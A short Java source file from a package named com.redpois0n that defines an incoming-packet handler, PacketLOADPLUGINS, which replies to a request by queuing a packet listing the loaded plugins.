package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Plugin;
import com.redpois0n.stub.packets.outgoing.Header;
import com.redpois0n.stub.packets.outgoing.Packet67LoadedPlugins;

public class PacketLOADPLUGINS extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet67LoadedPlugins());
	}

}
